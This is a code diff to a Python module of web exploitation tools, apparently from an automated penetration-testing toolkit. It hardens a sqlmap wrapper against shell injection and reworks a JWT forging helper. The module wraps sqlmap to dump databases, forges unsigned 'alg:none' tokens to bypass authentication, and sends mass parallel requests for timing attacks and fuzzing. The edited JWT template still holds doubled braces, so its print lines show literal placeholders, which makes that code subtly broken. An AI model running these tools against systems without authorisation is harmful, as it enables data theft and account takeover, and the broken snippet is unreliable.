@@ -1,6 +1,7 @@
 """HTTP / web exploitation tools."""
 from __future__ import annotations
 import re, json, socket, threading, time, os, importlib
+import shlex
 from collections import Counter
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from tools.shell import _shell, _w2l, IS_WINDOWS, USE_WSL, tool_execute_python, log
@@ -37,7 +38,6 @@ def tool_concurrent_requests(requests_list, workers=50, timeout=5):
     """Fire many HTTP requests in parallel — useful for timing attacks, cache probing, fuzzing."""
     try:
         import requests as req; req.packages.urllib3.disable_warnings()
-        session = req.Session()
         results = []
 
         def do_req(item):
@@ -45,7 +45,7 @@ def tool_concurrent_requests(requests_list, workers=50, timeout=5):
             method = item.get("method","GET")
             label = item.get("label", url)
             try:
-                r = session.request(method, url,
+                r = req.request(method, url,
                     headers=item.get("headers",{}),
                     data=item.get("data"),
                     cookies=item.get("cookies",{}),
@@ -297,16 +297,20 @@ def tool_sqlmap(target_url: str, param: str = "", data: str = "",
     Level 1-5 (thoroughness), Risk 1-3 (aggressiveness).
     Returns discovered databases, tables, data dump.
     """
-    cmd_parts = ["sqlmap", "-u", f"'{target_url}'", "--batch", "--random-agent",
+    cmd_parts = ["sqlmap", "-u", shlex.quote(str(target_url)), "--batch", "--random-agent",
                  f"--level={level}", f"--risk={risk}", f"--technique={technique}",
                  "--timeout=10", "--retries=2"]
-    if param:    cmd_parts += [f"-p '{param}'"]
-    if data:     cmd_parts += [f"--data='{data}'"]
-    if cookie:   cmd_parts += [f"--cookie='{cookie}'"]
+    if param:    cmd_parts += ["-p", shlex.quote(str(param))]
+    if data:     cmd_parts += ["--data", shlex.quote(str(data))]
+    if cookie:   cmd_parts += ["--cookie", shlex.quote(str(cookie))]
     if dbms:     cmd_parts += [f"--dbms={dbms}"]
-    if extra_args: cmd_parts.append(extra_args)
+    if extra_args:
+        try:
+            cmd_parts += [shlex.quote(part) for part in shlex.split(str(extra_args))]
+        except Exception:
+            pass
     # Try to dump everything useful
-    cmd_parts += ["--dbs", "--tables", "--dump-all", "--smart", "--stop-at-first",
+    cmd_parts += ["--dbs", "--tables", "--dump", "--smart",
                   f"--output-dir=/tmp/sqlmap_{int(time.time())}"]
 
     cmd = " ".join(cmd_parts) + " 2>&1"
@@ -1933,16 +1937,16 @@ else:
         if not token: return "Provide token="
         r = _jwt_tool(f"'{token}' -X a")
         if r: return r
-        code = f"""
+        code = """
 import base64, json, re
-tok = {repr(token)}
+tok = __TOKEN__
 parts = tok.split('.')
 header = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
 payload_bytes = base64.urlsafe_b64decode(parts[1]+'==')
 payload = json.loads(payload_bytes)
 
 # Apply overrides
-overrides = {repr(payload_overrides or {{}})}
+overrides = __OVERRIDES__
 payload.update(overrides)
 
 # Forge with alg:none
@@ -1954,6 +1958,8 @@ print(f'Forged (alg:none): {{forged}}')
 # Also try with empty signature
 print(f'With empty sig: {{forged}}')
 """
+        code = code.replace("__TOKEN__", repr(token))
+        code = code.replace("__OVERRIDES__", repr(payload_overrides or {}))
         return tool_execute_python(code, timeout=5)
 
     if operation == "rs256_hs256":
